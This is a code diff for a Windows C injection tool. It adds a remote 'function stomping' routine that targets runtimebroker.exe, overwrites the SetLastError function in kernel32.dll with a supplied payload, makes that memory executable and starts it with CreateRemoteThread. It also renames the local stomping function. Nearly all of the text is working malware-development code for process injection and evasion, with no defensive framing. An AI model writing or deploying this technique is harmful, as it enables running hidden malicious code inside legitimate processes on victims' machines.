@@ -4,7 +4,7 @@
 #pragma comment (lib, "Setupapi.lib") // adding "setupapi.dll" to the import address table
 
 
-BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+BOOL WritePayloadViaLocalFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
     *pAddress = &SetupScanFileQueueA;
 	DWORD	dwOldProtection = 0;
 
@@ -24,34 +24,60 @@ BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN 
 	return TRUE;
 }
 
-BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize, IN HANDLE hProcess) {
-    DWORD	dwOldProtection = 0;
-	SIZE_T	sNumberOfBytesWritten = 0;
+BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID* pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+	DWORD dwOldProtection = 0;
+	SIZE_T sNumberOfBytesWritten = 0;
 
+	DebugPrint("\n\n[i] Running with RemoteFunctionStomping ...\n\n");
+	HANDLE hProcess = NULL;
+	DWORD dwProcessId = 0;
+
+	if (!GetRemoteProcessHandle(L"runtimebroker.exe", &dwProcessId, &hProcess)) {
+		DebugPrint("[!] Failed to get remote process handle.\n");
+		return FALSE;
+	}
 	DebugPrint("[i] Found Target Process Pid: %d \n", GetProcessId(hProcess));
+	DebugPrint("[+] Address Of \"SetLastError\" In Remote Process: 0x%p \n", &SetLastError);
 
-	if (!GetRemoteProcAddress(hProcess, "kernel32.dll", "SetLastError", pAddress)) {
-		DebugPrint("[!] Failed to resolve remote function address.\n");
-		return FALSE;
+	if (!GetFunctionAddressInRemoteProcess(hProcess, "SetLastError", "kernel32.dll", pAddress)) {
+		DebugPrint("[!] Failed To Get Address Of SetLastError In Remote Process. \n");
+		CloseHandle(hProcess);
+		return -1;
 	}
+	DebugPrint("[i] Resolved Function Address: 0x%p\n", *pAddress);
 
-	DebugPrint("[i] Resolved Address: 0x%p\n", *pAddress);
-
+	// Change memory protection to allow writing
 	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
-		DebugPrint("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
+		DebugPrint("[!] VirtualProtectEx [RW] Failed With Error: %d \n", GetLastError());
 		return FALSE;
 	}
 
-	if (!WriteProcessMemory(hProcess, *pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
-		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
-		DebugPrint("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
+	// Write the payload to the specified address in the remote process
+	if (!WriteProcessMemory(hProcess, *pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) ||
+		sPayloadSize != sNumberOfBytesWritten) {
+		DebugPrint("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
+		DebugPrint("[!] Bytes Written: %llu of %llu \n", sNumberOfBytesWritten, sPayloadSize);
 		return FALSE;
 	}
 
+	// Change memory protection to allow execution
 	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
-		DebugPrint("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
+		DebugPrint("[!] VirtualProtectEx [RWX] Failed With Error: %d \n", GetLastError());
 		return FALSE;
 	}
+
+	DebugPrint("[+] Payload successfully written and memory protections updated. \n");
+
+	// Create a remote thread to execute the payload
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(*pAddress), NULL, 0, NULL);
+	if (hThread == NULL) {
+		DebugPrint("[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// Wait for the thread to complete execution
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
 
 	return TRUE;
 }
